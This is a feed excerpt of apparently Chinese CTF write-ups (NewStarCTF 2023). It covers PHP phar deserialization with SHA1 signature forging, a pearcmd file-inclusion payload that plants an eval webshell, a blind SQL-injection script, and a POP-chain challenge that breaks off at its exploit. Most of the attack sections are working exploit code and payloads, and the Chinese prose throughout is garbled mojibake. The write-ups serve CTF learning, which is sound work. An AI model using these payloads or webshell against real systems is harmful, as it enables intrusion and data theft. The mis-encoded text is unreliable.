class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>=<span class="hljs-string">&#x27;false&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;human&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>!=<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fffflag</span>;<br>        &#125; <span class="hljs-comment">//éœ€è¦ç»•è¿‡__wakeup(),ååºåˆ—åŒ–ä¸­__wakeupå…ˆäº__destruct</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;AshenOne&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;eating=<span class="hljs-string">&#x27;fire&#x27;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user.<span class="hljs-variable language_">$this</span>-&gt;pass;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$nothing</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;God==<span class="hljs-string">&#x27;true&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;eating);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Get Out!&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;                 <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// $Eden=new story();</span><br>    <span class="hljs-variable">$pear</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>];<br>    <span class="hljs-variable">$Adam</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br>    <span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$pear</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$file</span>));<span class="hljs-comment">//è§£ç åå†™å…¥$pear</span><br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$Adam</span>);<span class="hljs-comment">//æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;å¤šåƒé›ªæ¢¨&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//https://zhuanlan.zhihu.com/p/377676274</span><br></code></pre></td></tr></table></figure><p>æ²¡æœ‰<code>Unserialize</code>çš„ååºåˆ—åŒ–ï¼Œè¿˜æ˜¯<code>Phar</code>ã€‚å¯ä»¥é€šè¿‡<code>__destruct</code>æ‰§è¡Œå‘½ä»¤ï¼Œä½†å­˜åœ¨<code>__wakeup</code>é˜»ç¢(å¯ä»¥é€šè¿‡ä¿®æ”¹å±æ€§æ•°é‡ç»•è¿‡)ã€‚</p><p>å‚è€ƒï¼š<code>https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</code></p><p>ä¸»è¦å°±æ˜¯éœ€è¦ä¿®æ”¹<code>phar</code>æ–‡ä»¶çš„å†…å®¹(å±æ€§æ•°é‡)æ‰èƒ½å»ç»•è¿‡<code>__wakeup</code>ã€‚ä½†æ³¨æ„<code>phar</code>è¿™ä¸ªä¸œè¥¿æ˜¯æœ‰ç­¾åçš„ï¼Œæˆ‘ä»¬åœ¨æ­¤åŸºç¡€ä¸Šè¿˜è¦å¯¹æ–‡ä»¶ç­¾åè¿›è¡Œä¿®æ”¹ã€‚</p><p>å…ˆæŠŠ<code>wakeup</code>æ”¾ä¸€è¾¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setUser</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user = <span class="hljs-variable">$value</span>;<br>    &#125;<br>&#125;                 <br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">story</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">setUser</span>(<span class="hljs-string">&#x27;admin&#x27;</span>);<br><span class="hljs-variable">$a</span>-&gt;God=<span class="hljs-literal">true</span>;<br><span class="hljs-variable">$a</span>-&gt;eating=<span class="hljs-string">&#x27;cat /fl*&#x27;</span>;<span class="hljs-comment">//çœ‹äº†wpï¼Œçœ‹å¤©çœ¼äº†ç›´æ¥cat /fl*ã€‚æ­£å¸¸åšè‚¯å®šè¦ä¸€ç‚¹ç‚¹æ‰§è¡Œå‘½ä»¤ï¼šls ls /å•¥çš„</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;hacker.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>hex</code>æ‰“å¼€ï¼Œä¿®æ”¹ç±»å±æ€§çš„ä¸ªæ•°ä¸º<code>5</code>(æœ¬æ¥æ˜¯4)ï¼š</p><p><img src="/img/phar12.png" alt="phar12"></p><p>è¿™é‡Œå€Ÿç”¨<code>pankas</code>å¸ˆå‚…çš„ä¸€å¼ å›¾ï¼š</p><p><img src="/img/phar13.png" alt="phar13"></p><p>ç­¾åç±»å‹ä¸º<code>sha1</code>ï¼Œä¼ªé€ ç­¾åç®—æ³•ï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> hashlib import sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hacker.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    f = <span class="hljs-built_in">file</span>.<span class="hljs-built_in">read</span>() <span class="hljs-comment"># ä¿®æ”¹å†…å®¹åçš„pharæ–‡ä»¶,ä»¥äºŒè¿›åˆ¶æ–‡ä»¶å½¢å¼æ‰“å¼€</span><br>    <br>s = f[:<span class="hljs-number">-28</span>] <span class="hljs-comment"># è·å–è¦ç­¾åçš„æ•°æ®ï¼ˆå¯¹äºsha1ç­¾åçš„pharæ–‡ä»¶ï¼Œæ–‡ä»¶æœ«å°¾28å­—èŠ‚ä¸ºç­¾åçš„æ ¼å¼ï¼‰</span><br>h = f[<span class="hljs-number">-8</span>:] <span class="hljs-comment"># è·å–ç­¾åç±»å‹ä»¥åŠGBMBæ ‡è¯†ï¼Œå„4ä¸ªå­—èŠ‚</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># æ•°æ® + ç­¾å + (ç±»å‹ + GBMB)</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    <span class="hljs-built_in">file</span>.<span class="hljs-built_in">write</span>(newf) <span class="hljs-comment"># å†™å…¥æ–°æ–‡ä»¶</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week3</title>
    <link href="/2023/11/27/week3_Writeup_2023_NewStarCTF_Week3/"/>
    <url>/2023/11/27/week3_Writeup_2023_NewStarCTF_Week3/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTFç¬¬ä¸‰å‘¨ï¼Œèœé¸Ÿçš„wp</p><span id="more"></span><hr><h2 id="Include-ğŸ"><a href="#Include-ğŸ" class="headerlink" title="Include ğŸ"></a>Include ğŸ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<span class="hljs-comment">//è¿‡æ»¤ä¼ªåè®®åŠflag</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<br>        <br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<span class="hljs-comment">//æ–‡ä»¶åŒ…å«æ¼æ´</span><br>        <span class="hljs-comment"># Something in phpinfo.php!</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>?file=phpinfo</code>,<code>ctrl+F</code>æœç´¢<code>FLAG</code>:</p><p><img src="/img/pear1.png" alt="pear1"></p><p>è®©æˆ‘ä»¬å»æŸ¥çœ‹<code>register_argc_argv</code>:</p><p><img src="/img/pear3.png" alt="pear3"></p><p><code> register_argc_argv</code>å¼€å¯æ—¶æˆ‘ä»¬ä¼ å…¥getçš„å‚æ•°ä¼šè¢«è®°å½•åœ¨<code>$_SERVER</code>è¿™ä¸ªå…¨å±€å˜é‡æ•°ç»„ä¸­</p><p>å¹¶ä¸”<code>$argc</code>å˜é‡ç”¨äºè®°å½•æ•°ç»„çš„å¤§å°ã€‚ <code>$argv</code>å˜é‡æ˜¯ç”¨äºè®°å½•è¾“å…¥å‚æ•°ã€‚</p><p><img src="/img/pear4.png" alt="pear4"></p><p>å‚è€ƒPç¥çš„<code>Docker PHPè£¸æ–‡ä»¶æœ¬åœ°åŒ…å«ç»¼è¿°</code>:</p><p><code>payload</code>:<code>/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/hello.php</code></p><p><img src="/img/pearpear2.png" alt="pearpear2"></p><p>æ³¨æ„è¦åœ¨<code>bp</code>ä¸ŠæŠ“åŒ…ä¿®æ”¹ï¼Œå› ä¸º<code>URL``get</code>ä¼ å‚æ—¶ä¼šæŠŠ<code>&lt;&gt;</code>è¿™ç§è‡ªåŠ¨ç¼–ç ã€‚</p><p>ç„¶åè®¿é—®<code>/?file=tmp/hello</code></p><p><img src="/img/pearpear3.png" alt="pearpear3"></p><p><img src="/img/pearpear4.png" alt="pearpear4"></p><h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h2><p>å…ˆåˆ¤æ–­å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥ï¼š</p><p><code>/?id=TMP11503&#39;--+  å­—ç¬¦å‹æ³¨å…¥</code></p><p><code>or</code>,<code>select</code>è¿‡æ»¤äº†å°å†™ï¼Œ<code>union</code>åº”è¯¥æ˜¯æ­£åˆ™åŒ¹é…&#x2F;iæ¨¡å¼è¿‡æ»¤æ‰äº†ã€‚</p><p><code>?id=TMP0919&#39; And 1=1--+</code>æ­£å¸¸å›æ˜¾ï¼Œ<code>?id=TMP0919&#39; And 1=0--+</code>å›æ˜¾<code>id not exists</code></p><p><code>/?id=TMP0919&#39; And if(length(database())&gt;1,1,0)--+</code>æ­£å¸¸å›æ˜¾ï¼Œ<code>?id=TMP0919&#39; And if(length(database())&gt;99,1,0)--+</code>å›æ˜¾<code>id not exists</code></p><p>äºŒåˆ†æ³•+å¸ƒå°”ç›²æ³¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://f74c4214-b1b0-4485-b876-75128295a980.node4.buuoj.cn:81/&#x27;</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    low=<span class="hljs-number">31</span><br>    high=<span class="hljs-number">127</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low&lt;=high:<br>        payload = <span class="hljs-string">&quot;TMP0919&#x27;/**/And/**/if(Ascii(Substr(Database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i, mid)<span class="hljs-comment">#ctf</span><br><span class="hljs-comment">#çˆ†åº“,æ³¨æ„é¢˜ç›®æœ‰è¿‡æ»¤å¤§å°å†™</span><br><span class="hljs-comment">#if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#ctf</span><br><span class="hljs-comment">#çˆ†è¡¨  grades,here_is_flag</span><br><span class="hljs-comment">#if(Ascii(Substr((Select(Group_Concat(Table_Name))From(InfOrmation_Schema.Tables)Where(Table_Schema=&#x27;ctf&#x27;)</span><br><span class="hljs-comment">#çˆ†å­—æ®µï¼š #if(Ascii(Substr((Select(Group_Concat(Column_name))From(InfOrmation_Schema.Columns)Where(table_name=&#x27;here_is_flag&#x27;))  </span><br><span class="hljs-comment">#çˆ†æ•°æ®ï¼š</span><br><span class="hljs-comment">#if(ascii(substr((select(flag)from(here_is_flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        r = requests.get(url+<span class="hljs-string">&quot;?id=&quot;</span>+payload)<br>        <span class="hljs-comment">#r = requests.get(url=url,params=paylaod)</span><br>        time.sleep(<span class="hljs-number">0.03</span>)<br>        <span class="hljs-comment">#print(r.text)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;TMP0919&quot;</span> <span class="hljs-keyword">in</span> r.text):<br>            low = mid+<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid-<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>    result+=<span class="hljs-built_in">chr</span>(high+<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(result)<br>    time.sleep(<span class="hljs-number">0.03</span>)<br></code></pre></td></tr></table></figure><h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>ååºåˆ—åŒ–ä¸­çš„popé“¾æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<span class="hljs-comment">//æ­£åˆ™åŒ¹é…nameä¸­æ‰€æœ‰å¤§å°å†™å­—ç¬¦åŠæ•°å­—ï¼Œè¿™ä¸ªnameè¦æ˜¯ä¸ªå­—ç¬¦ä¸²ï¼Œç›®æµ‹è¦æŠŠæŸä¸ªç±»èµ‹å€¼ç»™nameè°ƒç”¨__toStringæ–¹æ³•</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)//æœç„¶æœ‰ä¸ª<span class="hljs-title">__toString</span>ï¼Œåº”è¯¥è¦ä»<span class="hljs-title">__destruct</span>è·³åˆ°è¿™é‡Œ</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<span class="hljs-comment">//è°ƒç”¨ $funcå­˜å‚¨çš„å‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªå»è°ƒç”¨__invokeå‡½æ•°</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)//åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨,åº”è¯¥è¦åˆ©ç”¨<span class="hljs-title">__invoke</span>è·³åˆ°è¿™é‡Œ</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)//è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<span class="hljs-comment">//unsetï¼Œé”€æ¯æŒ‡å®šå˜é‡ï¼Œé€šè¿‡è¿™ä¸ªè·³åˆ°__unset</span><br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)//å½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨<span class="hljs-title">unset</span>(<span class="hljs-params"></span>)æ—¶è¢«è°ƒç”¨</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <span class="hljs-comment">//å‡½æ•°æ‰§è¡Œ</span><br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]); <span class="hljs-comment">//ååºåˆ—åŒ–çš„å°¾å·´</span><br><br><span class="hljs-comment">//https://zhuanlan.zhihu.com/p/377676274</span><br></code></pre></td></tr></table></figure><p>å‡½æ•°è°ƒç”¨é¡ºåºï¼š</p><p><code>Beginä¸­çš„__destruct-&gt;Thenä¸­çš„__ToString-&gt;Superä¸­çš„__invoke-&gt;Handleä¸­çš„__call-&gt;CTFä¸­çš„end(unset)-&gt;WhiteGodä¸­çš„__unset</code></p><p><code>exp:</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 